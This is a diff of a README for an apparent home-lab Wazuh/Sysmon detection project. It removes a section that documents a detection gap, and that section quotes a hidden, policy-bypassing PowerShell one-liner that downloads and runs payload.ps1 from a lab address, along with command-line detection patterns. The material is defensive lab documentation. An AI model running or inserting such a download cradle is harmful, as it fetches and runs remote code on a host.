@@ -93,32 +93,7 @@ by the scan volume.
 
 Identified and suppressed a recurring false positive (Rule 92910 — OneDrive
 process legitimately accessing Explorer, flagged as possible process injection)
-using a custom local rule. See [`configs/local_rules.xml`](configs/local_rules.xml)
-for the exact rule definition. This demonstrates real-world alert tuning to
-reduce analyst fatigue from noisy detections.
-
----
-
-## Detection Gap Analysis: Encoded PowerShell Execution
-
-Attempted to simulate a Living-off-the-Land technique (T1059.001) using a hidden,
-execution-policy-bypassed PowerShell command with `DownloadString`:
-
-```powershell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.103/payload.ps1')"
-```
-
-Sysmon correctly logged the process creation event (Event ID 1) with the full
-command line, but no default Wazuh rule matched this specific pattern — meaning
-it would not have triggered an alert in this configuration.
-
-**Finding:** Default Wazuh/Sysmon rulesets do not flag common PowerShell-based
-LOLBins behavior out of the box. A production deployment would require custom
-detection rules matching command-line patterns like `-EncodedCommand`,
-`-WindowStyle Hidden`, or `IEX(New-Object Net.WebClient)`.
-
-This is documented as a finding rather than a failed test — identifying detection
-gaps is a core part of SOC alert tuning and rule development work.
+using a custom local rule.
 
 ---
 
@@ -141,7 +116,6 @@ Wazuh Manager → Rule Match → Python Integration → Discord Webhook → #waz
 
 - `configs/ossec.conf` — Wazuh manager configuration
 - `configs/custom-discord` — Python integration script (webhook redacted)
-- `configs/local_rules.xml` — custom rule tuning (false positive suppression)
 
 ---
 
